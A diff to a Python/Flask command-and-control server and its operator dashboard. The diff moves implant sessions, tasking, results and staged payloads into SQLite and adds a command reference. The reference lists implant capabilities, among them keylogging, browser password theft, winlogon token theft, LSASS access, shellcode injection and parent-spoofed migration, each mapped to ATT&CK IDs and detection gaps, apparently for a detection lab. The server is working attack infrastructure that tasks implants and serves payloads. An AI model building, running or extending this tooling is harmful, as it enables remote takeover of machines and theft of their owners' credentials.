@@ -23,10 +23,11 @@ Point c2_cli.py at the same URL with the operator token.
 from __future__ import annotations
 
 import argparse, base64, hashlib, json, os, secrets, sys, threading, time
-from collections import deque
 from datetime import datetime, timezone
 from functools import wraps
 from typing import Any
+
+from db import Store   # server/db.py — state that survives a restart
 
 try:
     from flask import Flask, request, jsonify, Response
@@ -117,6 +118,9 @@ CFG_DEFAULTS: dict[str, Any] = {
     "operator_token":   "change-me-operator",
     "dashboard_user":   "admin",
     "dashboard_pass":   "admin",
+    # SQLite store. Default is in-memory so importing the module has no side
+    # effects; --db / GHOST_DB_PATH (simpleserver.sh passes both) make it durable.
+    "db_path":          ":memory:",
 }
 
 def _load_config_file(path: str) -> dict:
@@ -133,7 +137,7 @@ def _load_config_file(path: str) -> dict:
 # Precedence: defaults < --config file < environment (GHOST_*) < CLI flags.
 _CFG: dict[str, Any] = dict(CFG_DEFAULTS)
 _ENV_SET: set[str] = set()
-for _k in ("beacon_token", "operator_token", "dashboard_user", "dashboard_pass"):
+for _k in ("beacon_token", "operator_token", "dashboard_user", "dashboard_pass", "db_path"):
     _env = os.environ.get("GHOST_" + _k.upper())
     if _env:
         _CFG[_k] = _env
@@ -145,20 +149,44 @@ AUDIT_CAP   = _CFG["audit_cap"]
 PAYLOAD_MAX = _CFG["payload_max"]
 SESSION_TTL = _CFG["session_ttl"]
 
-# ── In-memory store ───────────────────────────────────────────────────────────
-_lock    = threading.RLock()
-_sessions: dict[str, dict]         = {}
-_tasks:    dict[str, deque[dict]]  = {}   # items: {tid, cmd, state, ts}
-_results:  dict[str, deque[dict]]  = {}
-_done_tids: dict[str, deque[str]]  = {}   # per-session completed task ids (dedup)
-_audit:    deque[dict]             = None  # maxlen depends on config; set in main()
-_payload:  bytes | None            = None
+# ── Persistent store (SQLite) ─────────────────────────────────────────────────
+# Sessions, tasks, results, the audit trail and the staged payload live in
+# SQLite (server/db.py) so restarting the server no longer discards the lab's
+# history. The default path is in-memory: importing this module (as the test
+# suite does) must not create files, and `--db` / `simpleserver.sh` opt into a
+# durable database. Memory still holds what a restart should reset: the ECDH
+# keypair and the write lock.
+_store = Store(_CFG["db_path"], _CFG)
 
-def _audit_deque() -> deque:
-    global _audit
-    if _audit is None:
-        _audit = deque(maxlen=_CFG["audit_cap"])
-    return _audit
+
+def _reopen_store(path: str, *, force: bool = False) -> None:
+    """Swap to a different database.
+
+    Called once after CLI/config resolution; `force=True` re-opens the same file,
+    which is how the persistence tests simulate a server restart without a new
+    process (close + open is exactly what a restart does to the store).
+    """
+    global _store
+    if path == _store.path and not force:
+        return
+    _store.close()
+    _store = Store(path, _CFG)
+
+
+# Channel keys are epoch state, deliberately not persisted: a restart rotates
+# the server's ECDH keypair, so a key from before the restart is stale by
+# construction. The protocol suite caught the alternative — answering with a
+# stored key while advertising the new server point makes the implant re-key
+# before it can decrypt that same response.
+_channel_keys: dict[str, bytes] = {}
+
+
+def _session(sid: str) -> dict | None:
+    """Store view of a session plus its in-memory channel key."""
+    s = _store.session(sid)
+    if s is not None:
+        s["key"] = _channel_keys.get(sid)
+    return s
 
 # ── Flask ─────────────────────────────────────────────────────────────────────
 app = Flask(__name__, static_folder=None)
@@ -179,8 +207,7 @@ def _sc(a: str, b: str) -> bool:
     return secrets.compare_digest(a.encode("utf-8"), b.encode("utf-8"))
 
 def _audit_log(action: str, detail: dict) -> None:
-    with _lock:
-        _audit_deque().append({"ts": _now(), "ip": _client_ip(), "action": action, "detail": detail})
+    _store.audit(action, _client_ip(), detail, time.time())
 
 def _cors(r: Response) -> Response:
     r.headers["Access-Control-Allow-Origin"]  = "*"
@@ -227,16 +254,12 @@ def preflight(p=""):
 # ── Health ────────────────────────────────────────────────────────────────────
 @app.route("/health", methods=["GET"])
 def health():
-    with _lock:
-        count = len(_sessions)
-    return _json_r({"status": "ok", "ts": _now(), "sessions": count})
+    return _json_r({"status": "ok", "ts": _now(), "sessions": _store.counts()["sessions"]})
 
 @app.route("/ping", methods=["GET"])
 def ping():
     """CLI liveness probe — same contract as /health."""
-    with _lock:
-        count = len(_sessions)
-    return _json_r({"status": "ok", "ts": _now(), "sessions": count})
+    return _json_r({"status": "ok", "ts": _now(), "sessions": _store.counts()["sessions"]})
 
 # ── Beacon ────────────────────────────────────────────────────────────────────
 @app.route("/beacon", methods=["POST"])
@@ -258,8 +281,7 @@ def beacon():
         if not sid_hdr:
             return _err("Missing session header", 400)
         sid = sid_hdr
-        with _lock:
-            stored_key = _sessions.get(sid, {}).get("key")
+        stored_key = (_session(sid) or {}).get("key")
         payload = None
         # Stored key first, then a freshly derived one (covers a server
         # restart that rotated the ECDH keypair).
@@ -284,8 +306,7 @@ def beacon():
         channel_key = derived
         bootstrap = True
     else:
-        with _lock:
-            channel_key = _sessions.get(sid, {}).get("key")
+        channel_key = (_session(sid) or {}).get("key")
 
     if not sid:
         return _err("Missing session", 400)
@@ -299,80 +320,57 @@ def beacon():
         return _err("Bad counter", 400)
 
     ip = _client_ip()
-    ts = _now()
+    ts = time.time()
 
     cmd_out = "sleep"
     task_tid = ""
     audit_action = "beacon"
     audit_detail: dict = {"sid": sid, "enc": bool(channel_key)}
 
-    with _lock:
-        existing = _sessions.get(sid)
-        status   = existing["status"] if existing else ("accepted" if _CFG["auto_accept"] else "pending")
-        recon    = body.get("recon") if isinstance(body.get("recon"), dict) else (existing["recon"] if existing else {})
+    existing = _store.session(sid)
+    status   = existing["status"] if existing else ("accepted" if _CFG["auto_accept"] else "pending")
+    recon    = body.get("recon") if isinstance(body.get("recon"), dict) else (existing["recon"] if existing else {})
 
-        last_rx = existing.get("last_rx_n", 0) if existing else 0
-        if bootstrap:
-            last_rx = msg_n          # new epoch: re-baseline the replay window
-        elif channel_key:
-            if msg_n <= last_rx:
-                _audit_log("replay_rejected", {"sid": sid, "n": msg_n, "last": last_rx})
-                return _err("Replayed counter", 400)
-        _sessions[sid] = {
-            "session":       sid,
-            "remote_ip":     ip,
-            "first_seen":    existing["first_seen"] if existing else ts,
-            "last_beacon":   ts,
-            "recon":         recon,
-            "run":           str(body.get("run", ""))[:16] or (existing.get("run") if existing else ""),
-            "last_rx_n":     msg_n if (bootstrap or channel_key) else last_rx,
-            "pending_tasks": sum(1 for t in _tasks.get(sid, []) if t["state"] != "done"),
-            "result_count":  len(_results.get(sid, [])),
-            "status":        status,
-            "key":           channel_key or (existing.get("key") if existing else None),
-        }
-        if status == "rejected":
-            cmd_out      = "exit"
-            audit_action = "beacon_rejected"
-        elif status == "killed":
-            # Operator killed this node — keep serving exit until it dies.
-            cmd_out = "exit"
-        elif status == "pending":
-            audit_detail["status"] = "pending"
-        else:
-            # Operator acknowledgement of the previously served task.
-            ack_tid = str(body.get("ack", ""))[:16]
-            if ack_tid:
-                for t in _tasks.get(sid, []):
-                    if t["tid"] == ack_tid and t["state"] in ("sent", "queued"):
-                        t["state"] = "acked"
-                        _audit_log("task_ack", {"sid": sid, "tid": ack_tid})
-                        break
-            # Serve the leftmost non-done task. A task that was already sent
-            # but not yet acked/done is served AGAIN (at-least-once delivery);
-            # the implant deduplicates by task id, so a lost beacon costs a
-            # re-send, not a lost task.
-            q = _tasks.get(sid)
-            if q:
-                while q and q[0]["state"] == "done":
-                    q.popleft()
-                if q:
-                    served = q[0]
-                    task_tid = served["tid"]
-                    if served["state"] == "queued":
-                        served["state"] = "sent"
-                        served["sent_ts"] = ts
-                        _audit_log("task_sent", {"sid": sid, "tid": task_tid})
-                    elif served["state"] == "sent" and served.get("sent_ts"):
-                        # retry only after a grace window so rapid beacons
-                        # don't duplicate deliveries mid-flight
-                        served["state"] = "sent"
-                    cmd_out = served["cmd"]
-                _sessions[sid]["pending_tasks"] = sum(1 for t in q if t["state"] != "done")
+    last_rx = existing.get("last_rx_n", 0) if existing else 0
+    if bootstrap:
+        last_rx = msg_n          # new epoch: re-baseline the replay window
+    elif channel_key:
+        if msg_n <= last_rx:
+            _audit_log("replay_rejected", {"sid": sid, "n": msg_n, "last": last_rx})
+            return _err("Replayed counter", 400)
 
-        # Server → implant response counter (also replay-protected).
-        tx_n = int(existing.get("tx_n", 0)) + 1 if existing else 1
-        _sessions[sid]["tx_n"] = tx_n
+    tx_n = int(existing.get("tx_n", 0)) + 1 if existing else 1
+    _store.upsert_beacon(
+        sid, ip=ip, ts=ts, recon=recon,
+        run=str(body.get("run", ""))[:16] or (existing.get("run") if existing else ""),
+        last_rx_n=msg_n if (bootstrap or channel_key) else last_rx,
+        tx_n=tx_n, status=status)
+    if channel_key:
+        _channel_keys[sid] = channel_key
+
+    if status == "rejected":
+        cmd_out      = "exit"
+        audit_action = "beacon_rejected"
+    elif status == "killed":
+        # Operator killed this node — keep serving exit until it dies.
+        cmd_out = "exit"
+    elif status == "pending":
+        audit_detail["status"] = "pending"
+    else:
+        # Operator acknowledgement of the previously served task.
+        ack_tid = str(body.get("ack", ""))[:16]
+        if ack_tid and _store.ack_task(sid, ack_tid):
+            _audit_log("task_ack", {"sid": sid, "tid": ack_tid})
+        # Serve the leftmost non-done task. A task that was already sent but not
+        # yet acked is served AGAIN (at-least-once delivery); the implant
+        # deduplicates by task id, so a lost beacon costs a re-send, not a lost
+        # task.
+        served = _store.claim_task(sid, ts)
+        if served:
+            task_tid = served["tid"]
+            cmd_out  = served["cmd"]
+            if served["transitioned"]:
+                _audit_log("task_sent", {"sid": sid, "tid": task_tid})
 
     _audit_log(audit_action, audit_detail)
 
@@ -401,8 +399,7 @@ def result():
         if not sid_hdr:
             return _err("Missing session header", 400)
         sid = sid_hdr
-        with _lock:
-            stored_key = _sessions.get(sid, {}).get("key")
+        stored_key = (_session(sid) or {}).get("key")
         payload = None
         for k in (stored_key, derived):
             if k is None:
@@ -432,35 +429,23 @@ def result():
     if not sid:
         return _err("Missing session", 400)
 
-    with _lock:
-        existing = _sessions.get(sid)
-        last_rx = existing.get("last_rx_n", 0) if existing else 0
-        if bootstrap:
-            last_rx = msg_n
-        elif channel_key:
-            if msg_n <= last_rx:
-                _audit_log("replay_rejected", {"sid": sid, "n": msg_n, "last": last_rx})
-                return _err("Replayed counter", 400)
-        if existing is not None and (bootstrap or channel_key):
-            existing["last_rx_n"] = msg_n
+    existing = _store.session(sid)
+    last_rx = existing.get("last_rx_n", 0) if existing else 0
+    if bootstrap:
+        last_rx = msg_n
+    elif channel_key:
+        if msg_n <= last_rx:
+            _audit_log("replay_rejected", {"sid": sid, "n": msg_n, "last": last_rx})
+            return _err("Replayed counter", 400)
+    if existing is not None and (bootstrap or channel_key):
+        _store.set_last_rx(sid, msg_n)
 
-        # Task-id dedup: a retried task yields a duplicate result — keep the
-        # first, acknowledge the rest, and always mark the task done.
-        done = _done_tids.setdefault(sid, deque(maxlen=_CFG["task_queue_max"]))
-        if tid and tid in done:
-            _audit_log("result_dup", {"sid": sid, "tid": tid, "status": status})
-            return _json_r({"status": "ok", "dup": True})
-        if tid:
-            done.append(tid)
-            for t in _tasks.get(sid, []):
-                if t["tid"] == tid:
-                    t["state"] = "done"
-                    break
-
-        q = _results.setdefault(sid, deque(maxlen=_CFG["result_cap"]))
-        q.append({"ts": _now(), "tid": tid, "status": status, "output": output})
-        if sid in _sessions:
-            _sessions[sid]["result_count"] = len(q)
+    # Task-id dedup: a retried task yields a duplicate result — keep the first,
+    # acknowledge the rest, and always mark the task done. The store does the
+    # done-id bookkeeping and the result cap in one call.
+    if not _store.add_result(sid, tid, status, output, time.time()):
+        _audit_log("result_dup", {"sid": sid, "tid": tid, "status": status})
+        return _json_r({"status": "ok", "dup": True})
 
     _audit_log("result", {"sid": sid, "tid": tid, "status": status, "size": len(output)})
     return _json_r({"status": "ok"})
@@ -469,58 +454,32 @@ def result():
 @app.route("/sessions", methods=["GET"])
 @require_operator
 def list_sessions():
-    now_dt = datetime.now(timezone.utc)
-    with _lock:
-        out = []
-        for s in _sessions.values():
-            try:
-                lb = datetime.fromisoformat(s["last_beacon"].replace("Z", "+00:00"))
-                idle = int((now_dt - lb).total_seconds())
-            except Exception:
-                idle = 0
-            internal = ("key", "last_rx_n", "tx_n")
-            pub = {k: v for k, v in s.items() if k not in internal}
-            q = _tasks.get(s["session"], [])
-            pub["task_states"] = {
-                "queued": sum(1 for t in q if t["state"] == "queued"),
-                "sent":   sum(1 for t in q if t["state"] == "sent"),
-                "acked":  sum(1 for t in q if t["state"] == "acked"),
-                "done":   sum(1 for t in q if t["state"] == "done"),
-            }
-            pub["idle_seconds"] = idle
-            out.append(pub)
-    return _json_r(out)
+    # Counts, task-state histogram and idle time are computed in the store so a
+    # restarted server answers from the database rather than from nothing.
+    return _json_r(_store.sessions_public())
 
 @app.route("/sessions/<path:sid>", methods=["DELETE"])
 @require_operator
 def kill_session(sid):
-    with _lock:
-        if sid not in _sessions:
-            return _err("Session not found", 404)
-        q = _tasks.setdefault(sid, deque())
-        q.appendleft("exit")
-        _sessions[sid]["pending_tasks"] = len(q)
-        _sessions[sid]["status"] = "killed"
+    if not _store.kill(sid):
+        return _err("Session not found", 404)
+    _channel_keys.pop(sid, None)
     _audit_log("kill_session", {"session": sid})
     return _json_r({"status": "exit_queued", "session": sid})
 
 @app.route("/sessions/<path:sid>/accept", methods=["POST"])
 @require_operator
 def accept_session(sid):
-    with _lock:
-        if sid not in _sessions:
-            return _err("Session not found", 404)
-        _sessions[sid]["status"] = "accepted"
+    if not _store.set_status(sid, "accepted"):
+        return _err("Session not found", 404)
     _audit_log("session_accepted", {"sid": sid})
     return _json_r({"status": "accepted"})
 
 @app.route("/sessions/<path:sid>/reject", methods=["POST"])
 @require_operator
 def reject_session(sid):
-    with _lock:
-        if sid not in _sessions:
-            return _err("Session not found", 404)
-        _sessions[sid]["status"] = "rejected"
+    if not _store.set_status(sid, "rejected"):
+        return _err("Session not found", 404)
     _audit_log("session_rejected", {"sid": sid})
     return _json_r({"status": "rejected"})
 
@@ -533,16 +492,11 @@ def add_task():
     cmd  = str(body.get("cmd",     ""))[:4096].strip()
     if not sid or not cmd:
         return _err("Missing session or cmd", 400)
-    with _lock:
-        if sid not in _sessions:
-            return _err("Session not found", 404)
-        q = _tasks.setdefault(sid, deque())
-        if len(q) >= _CFG["task_queue_max"]:
-            return _err("Task queue full", 429)
-        tid = secrets.token_hex(4)
-        q.append({"tid": tid, "cmd": cmd, "state": "queued", "ts": _now()})
-        _sessions[sid]["pending_tasks"] = sum(1 for t in q if t["state"] != "done")
-        depth = len(q)
+    if not _store.session(sid):
+        return _err("Session not found", 404)
+    tid, depth = _store.enqueue(sid, cmd, time.time())
+    if tid is None:
+        return _err("Task queue full", 429)
     _audit_log("task_queued", {"session": sid, "tid": tid, "cmd": cmd})
     return _json_r({"status": "queued", "tid": tid, "queue_depth": depth})
 
@@ -551,13 +505,11 @@ def add_task():
 @require_operator
 def get_results(sid):
     clear = request.args.get("clear") == "1"
-    with _lock:
-        if sid not in _sessions:
-            return _err("Session not found", 404)
-        entries = list(_results.get(sid, []))
-        if clear:
-            _results[sid] = deque(maxlen=_CFG["result_cap"])
-            _sessions[sid]["result_count"] = 0
+    if not _store.session(sid):
+        return _err("Session not found", 404)
+    entries = _store.results(sid)
+    if clear:
+        _store.clear_results(sid)
     _audit_log("get_results", {"session": sid, "count": len(entries), "clear": clear})
     return _json_r({"session": sid, "results": entries})
 
@@ -565,32 +517,31 @@ def get_results(sid):
 @app.route("/payload", methods=["POST"])
 @require_operator
 def upload_payload():
-    global _payload
     data = request.get_data()
     if not data:
         return _err("Empty body", 400)
     if len(data) > _CFG["payload_max"]:
         return _err("Payload too large (max 32 MB)", 413)
-    _payload = data
-    _audit_log("payload_uploaded", {"bytes": len(data)})
+    name = str(request.headers.get("X-Payload-Name", ""))[:128]
+    _store.set_payload(name, data, time.time())
+    _audit_log("payload_uploaded", {"bytes": len(data), "name": name})
     return _json_r({"status": "ok", "bytes": len(data)})
 
 @app.route("/payload", methods=["GET"])
 @require_beacon
 def download_payload():
-    global _payload
     sid = request.headers.get("X-Session-ID", "").strip()
     if not sid:
         return _err("Missing session", 400)
-    with _lock:
-        if sid not in _sessions:
-            return _err("Unauthorized", 401)
-    if _payload is None:
+    if not _store.session(sid):
+        return _err("Unauthorized", 401)
+    entry = _store.payload()
+    if entry is None:
         return _err("No payload stored", 404)
-    _audit_log("payload_downloaded", {"sid": sid, "bytes": len(_payload)})
-    return Response(_payload,
+    _audit_log("payload_downloaded", {"sid": sid, "bytes": entry["size"]})
+    return Response(entry["blob"],
                     mimetype="application/octet-stream",
-                    headers={"Content-Length": str(len(_payload)),
+                    headers={"Content-Length": str(entry["size"]),
                              "Cache-Control": "no-store"})
 
 # ── Audit ─────────────────────────────────────────────────────────────────────
@@ -598,15 +549,12 @@ def download_payload():
 @require_operator
 def get_audit():
     limit = min(int(request.args.get("limit", 100)), _CFG["audit_cap"])
-    with _lock:
-        entries = list(_audit_deque())[-limit:]
-    return _json_r({"entries": entries})
+    return _json_r({"entries": _store.audit_entries(limit)})
 
 @app.route("/audit/clear", methods=["POST"])
 @require_operator
 def clear_audit():
-    with _lock:
-        _audit_deque().clear()
+    _store.clear_audit()
     return _json_r({"status": "cleared"})
 
 # ── Auth (dashboard login) ────────────────────────────────────────────────────
@@ -1116,6 +1064,60 @@ header{height:58px;display:flex;align-items:center;gap:0;padding:0 14px;flex-shr
 .pal-item.active svg{opacity:1}
 .pal-empty{padding:26px;text-align:center;color:var(--faint);font-size:12px;font-family:var(--mono)}
 
+/* ── command reference overlay ─────────────────────────────────────── */
+#help-ov{position:fixed;inset:0;background:rgba(3,5,10,.66);backdrop-filter:blur(6px);z-index:9996;
+  display:none;align-items:flex-start;justify-content:center;padding:5vh 14px}
+#help-ov.show{display:flex;animation:fadeIn .15s ease}
+.help-card{width:min(1080px,96vw);max-height:90vh;display:flex;flex-direction:column;
+  background:rgba(13,19,34,.975);border:1px solid var(--line2);border-radius:16px;
+  box-shadow:0 40px 120px rgba(0,0,0,.62);overflow:hidden}
+.help-head{display:flex;align-items:center;gap:12px;padding:15px 18px;border-bottom:1px solid var(--line)}
+.help-head>svg{width:18px;height:18px;color:var(--acc);flex-shrink:0}
+.help-title{font-size:13px;font-weight:800;letter-spacing:.02em}
+.help-sub{font-size:10.5px;color:var(--dim);font-family:var(--mono);margin-top:2px}
+.help-close{margin-left:auto}
+.help-search{display:flex;align-items:center;gap:11px;padding:11px 18px;border-bottom:1px solid var(--line)}
+.help-search>svg{width:15px;height:15px;color:var(--dim);flex-shrink:0}
+.help-search input{flex:1;background:transparent;border:none;outline:none;color:var(--txt);
+  font-family:var(--mono);font-size:13px}
+.help-search input::placeholder{color:var(--faint)}
+.help-body{overflow:auto;padding:4px 18px 20px;scrollbar-width:thin}
+.help-steps{display:grid;grid-template-columns:repeat(auto-fit,minmax(240px,1fr));gap:10px;margin:14px 0 8px}
+.help-step{border:1px solid var(--line);border-radius:11px;padding:11px 12px;background:rgba(9,13,24,.5);
+  transition:border-color .18s}
+.help-step:hover{border-color:var(--line2)}
+.help-step b{display:block;font-size:9.5px;letter-spacing:.16em;text-transform:uppercase;
+  color:var(--acc);margin-bottom:6px;font-weight:800}
+.help-step p{font-size:11.5px;color:var(--txt2);line-height:1.55;margin:0 0 7px}
+.help-step code{font-family:var(--mono);font-size:10.5px;color:var(--txt);background:rgba(6,10,20,.7);
+  border:1px solid var(--line);border-radius:6px;padding:3px 6px;display:inline-block;word-break:break-all}
+.help-cat{font-size:9px;font-weight:800;letter-spacing:.2em;color:var(--faint);text-transform:uppercase;
+  padding:16px 2px 7px;position:sticky;top:0;background:linear-gradient(rgba(13,19,34,.98),rgba(13,19,34,.92));
+  z-index:2}
+.help-row{display:grid;grid-template-columns:minmax(210px,1.05fr) minmax(260px,1.5fr) minmax(170px,.95fr);
+  gap:12px;padding:9px 10px;border-radius:9px;border:1px solid transparent;cursor:pointer;
+  transition:background .16s,border-color .16s;align-items:baseline}
+.help-row:hover{background:var(--acc-dim);border-color:var(--line2)}
+.help-row:focus-visible{background:var(--acc-dim);border-color:var(--acc);outline:2px solid var(--acc);outline-offset:-2px}
+.help-search input:focus-visible{outline:2px solid var(--acc);outline-offset:3px;border-radius:6px}
+.help-cmd{font-family:var(--mono);font-size:11.5px;color:var(--acc);overflow:hidden;text-overflow:ellipsis;
+  white-space:nowrap}
+.help-desc{font-size:12px;color:var(--txt2);line-height:1.55}
+.help-tel{font-family:var(--mono);font-size:10.5px;color:var(--dim);line-height:1.5}
+.help-note{margin-top:16px;border:1px solid var(--line);border-left:2px solid var(--acc);
+  border-radius:10px;padding:11px 13px;background:rgba(9,13,24,.45);font-size:11.5px;color:var(--txt2);
+  line-height:1.6}
+.help-note b{color:var(--txt);font-weight:700}
+.help-empty{padding:30px;text-align:center;color:var(--faint);font-size:12px;font-family:var(--mono)}
+.help-row.info{cursor:default}
+.help-row.info:hover{background:transparent;border-color:transparent}
+.help-row.info .help-cmd{color:var(--txt2)}
+@media (max-width:820px){
+  .help-row{grid-template-columns:1fr;gap:4px}
+  .help-cmd{white-space:normal}
+  .help-steps{grid-template-columns:1fr}
+}
+
 /* ── File browser ──────────────────────────────────────────────────────── */
 #files-pane{flex:1;overflow-y:auto;display:none;min-height:0;padding:14px 16px}
 .fbar{display:flex;gap:8px;margin-bottom:12px}
@@ -1165,6 +1167,7 @@ header{height:58px;display:flex;align-items:center;gap:0;padding:0 14px;flex-shr
   <div class="chip"><span class="lbl">Link</span><span class="val" id="st-link">—</span></div>
   <div class="chip"><span class="lbl">Last beacon</span><span class="val" id="st-beacon">—</span></div>
   <div class="hright">
+    <button class="hbtn" onclick="openHelp()" aria-haspopup="dialog"><svg width="12" height="12" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><path d="m4 17 6-6-6-6M12 19h8"/></svg>Commands <kbd>?</kbd></button>
     <button class="hbtn" onclick="openPalette()"><svg width="12" height="12" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><circle cx="11" cy="11" r="7"/><path d="m20 20-3.8-3.8"/></svg>Search <kbd>Ctrl K</kbd></button>
     <span id="clock"></span>
     <button class="hbtn danger" onclick="logout()">Sign out</button>
@@ -1220,7 +1223,7 @@ header{height:58px;display:flex;align-items:center;gap:0;padding:0 14px;flex-shr
         <circle cx="9.2" cy="10.2" r="1" fill="currentColor"/><circle cx="14.8" cy="10.2" r="1" fill="currentColor"/>
       </svg>
       <div class="empty-msg">Select a node</div>
-      <div class="empty-sub">or press <kbd>Ctrl K</kbd> to search</div>
+      <div class="empty-sub">press <kbd>Ctrl K</kbd> to search &middot; <kbd>?</kbd> for the command reference</div>
     </div>
     <div id="console"></div>
     <div id="recon"></div>
@@ -1281,6 +1284,28 @@ header{height:58px;display:flex;align-items:center;gap:0;padding:0 14px;flex-shr
       <div id="pl-info"></div>
       <div class="pl-note">The staged payload is served to implants over the beacon-authenticated <span style="color:var(--acc)">/payload</span> endpoint — retrieve it on the target with a <span style="color:var(--acc)">download</span> task.</div>
     </div>
+  </div>
+</div>
+<div id="help-ov" role="dialog" aria-modal="true" aria-labelledby="help-title"
+     onclick="if(event.target===this)closeHelp()">
+  <div class="help-card">
+    <div class="help-head">
+      <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" aria-hidden="true">
+        <path d="m4 17 6-6-6-6M12 19h8"/></svg>
+      <div>
+        <div class="help-title" id="help-title">Command reference</div>
+        <div class="help-sub">every task the implant accepts, what it does, and what it leaves in telemetry</div>
+      </div>
+      <button class="icon-btn help-close" onclick="closeHelp()" aria-label="Close command reference">&#x2715;</button>
+    </div>
+    <div class="help-search">
+      <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" aria-hidden="true">
+        <circle cx="11" cy="11" r="7"/><path d="m20 20-3.8-3.8"/></svg>
+      <input id="help-input" placeholder="filter commands by name, purpose or technique…" aria-label="Filter commands"
+             oninput="helpRender()" onkeydown="if(event.key==='Escape')closeHelp()">
+      <kbd>Esc</kbd>
+    </div>
+    <div class="help-body" id="help-body"></div>
   </div>
 </div>
 <div id="toasts"></div>
@@ -1960,8 +1985,10 @@ header{height:58px;display:flex;align-items:center;gap:0;padding:0 14px;flex-shr
   function palRender(){
     const q=($('pal-input').value||'').toLowerCase();
     palItems=[];
-    const quick=['whoami /all','ipconfig /all','systeminfo','tasklist /v','!ps','netstat -ano','!screenshot','!browser','!getpid','!env'];
-    const cmds=quick.filter(c=>c.toLowerCase().includes(q)).map(c=>({g:'Commands',label:c,sub:selectedSid?'send':'no node',run:()=>{closePalette();if(currentTab!=='console')switchTab('console');sendCmd(c);}}));
+    const cmds=CMD_REF.filter(r=>!r.x).filter(r=>!q||(r.cmd+' '+r.d+' '+r.t+' '+r.c).toLowerCase().includes(q))
+      .slice(0,40)
+      .map(r=>({g:r.c,label:r.cmd,sub:selectedSid?(/[<\[|]/.test(r.cmd)?'load':'send'):'copy',
+        run:()=>{closePalette();helpUse(r.cmd,!selectedSid?false:!/[<\[|]/.test(r.cmd));}}));
     const acts=[
       {g:'Actions',label:'Refresh sessions',run:()=>{closePalette();refreshSessions();}},
       {g:'Actions',label:'Clear console output',run:()=>{closePalette();clearResults();}},
@@ -1998,12 +2025,141 @@ header{height:58px;display:flex;align-items:center;gap:0;padding:0 14px;flex-shr
   document.addEventListener('keydown',e=>{
     if((e.ctrlKey||e.metaKey)&&e.key.toLowerCase()==='k'){e.preventDefault();
       $('palette-ov').classList.contains('show')?closePalette():openPalette();return;}
-    if(e.key==='Escape'){closePalette();if($('modal-ov').classList.contains('show'))modalResolve(false);return;}
+    if(e.key==='Escape'){closeHelp();closePalette();if($('modal-ov').classList.contains('show'))modalResolve(false);return;}
+    if(e.key==='?'&&!['INPUT','TEXTAREA'].includes(document.activeElement?.tagName)){e.preventDefault();
+      $('help-ov').classList.contains('show')?closeHelp():openHelp();return;}
     if(e.key==='/'&&!['INPUT','TEXTAREA'].includes(document.activeElement?.tagName)&&selectedSid&&selectedStatus==='accepted'){
       e.preventDefault();$('cmd-input').focus();}
   });
   $('palette-ov').addEventListener('mousedown',e=>{if(e.target.id==='palette-ov')closePalette();});
   $('modal-ov').addEventListener('mousedown',e=>{if(e.target.id==='modal-ov')modalResolve(false);});
+
+  /* ── command reference (single source for the help panel and the palette) ── */
+  const CMD_REF=[
+    {c:'Shell and recon',cmd:'<any shell command>',d:'Runs in a persistent cmd.exe. cd, a bare drive letter and set VAR=v carry over to later tasks.',t:'T1059.003 · EID 1 (parent is the implant)'},
+    {c:'Shell and recon',cmd:'ps',d:'Process listing with owner and command line. !ps is the same handler.',t:'T1057 · EID 1'},
+    {c:'Shell and recon',cmd:'ps1 <line>',d:'Line into a persistent PowerShell session. psreset restarts it.',t:'T1059.001 · EID 1'},
+    {c:'Shell and recon',cmd:'!env',d:'Environment block dump, one variable per line.',t:'T1082 · no host event (gap)'},
+    {c:'Shell and recon',cmd:'!getpid',d:'The implant process id.',t:'no event'},
+    {c:'Shell and recon',cmd:'!kill <pid>',d:'Terminate a process by id.',t:'T1489 · EID 5 + EID 1'},
+    {c:'Shell and recon',cmd:'!files [path]',d:'Directory listing performed by the implant; empty path lists drives.',t:'T1083 · no host event (gap)'},
+    {c:'Capture and input',cmd:'!screenshot [scale]',d:'Full-screen capture as JPEG (automatic BMP fallback), streamed back as base64.',t:'T1113 · no host event (gap)'},
+    {c:'Capture and input',cmd:'!live [scale]',d:'Beacon-paced live frames for a rough remote view.',t:'T1113 · no host event (gap)'},
+    {c:'Capture and input',cmd:'!input m <nx> <ny> <btns>',d:'Synthetic mouse move and buttons, normalised 0-65535.',t:'T1021.005 (with VNC) · no host event'},
+    {c:'Capture and input',cmd:'!input k <vk> <down>',d:'Synthetic key press or release by virtual-key code.',t:'T1021.005 · no host event'},
+    {c:'Capture and input',cmd:'keylog_start',d:'Install the low-level keyboard hook. keylog_dump reads the buffer, keylog_stop removes it.',t:'T1056.001 · no ETW provider (gap)'},
+    {c:'Capture and input',cmd:'!clipboard get',d:'Read clipboard text. !clipboard set <text> writes it.',t:'T1115 · no host event (gap)'},
+    {c:'Capture and input',cmd:'!browser',d:'Edge/Chrome saved-password recovery through a stock-Windows pipeline (winsqlite3 + DPAPI).',t:'T1555.003 · EID 7 + EID 11 (ruled)'},
+    {c:'Capture and input',cmd:'!vnc <host[:port]>',d:'Reverse VNC: the implant dials the viewer (default 5500), RFB 3.3, no auth.',t:'T1021.005 · EID 3 high port (ruled)'},
+    {c:'Credential access',cmd:'steal_token',d:'Find winlogon.exe, duplicate its primary token and impersonate SYSTEM. Needs an elevated token.',t:'T1134.001 · EID 10 winlogon 0x400 (ruled)'},
+    {c:'Credential access',cmd:'!lsass',d:'Bounded LSASS access and read statistics (region and byte counts). No dump file and no credential parser ship with the framework.',t:'T1003.001 · EID 10 0x1010/0x1410 (ruled)'},
+    {c:'Injection and migration',cmd:'!inject <pid> <hex bytes>',d:'Load raw shellcode into a process through the direct-syscall remote-thread chain.',t:'T1055 · EID 10 + EID 8 (ruled)'},
+    {c:'Injection and migration',cmd:'!inject-apc <pid> <hex bytes>',d:'Same payload delivered as an APC to one of the target threads.',t:'T1055.004 · EID 10 only (gap)'},
+    {c:'Injection and migration',cmd:'!inject-stomp <pid> <hex bytes> [dll]',d:'Module stomping: payload runs from the .text of a signed System32 DLL (default amsi.dll) loaded into the target.',t:'T1055 · EID 8 + EID 7; host module is not restored'},
+    {c:'Injection and migration',cmd:'!migrate [pid]',d:'Re-spawn the implant as a PPID-spoofed child of the given process (default a SYSTEM svchost) and exit cleanly.',t:'T1134.004 · EID 1 with a spoofed parent (ruled)'},
